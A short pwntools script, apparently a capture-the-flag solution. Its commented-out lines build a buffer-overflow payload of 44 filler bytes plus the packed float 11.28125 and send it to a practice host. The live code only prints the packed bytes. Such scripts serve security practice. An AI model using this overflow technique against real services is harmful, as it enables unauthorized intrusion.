from pwn import *
import struct

# s = remote('node3.buuoj.cn', 26140)
float_value = 0x41348000
# payload = b'a'*44+p64(float_value)

# s.sendline(payload)
# s.interactive()
# by = struct.pack('f', 11.28125)
by = p64(float_value)
print(by)
# print(p64(11.28125))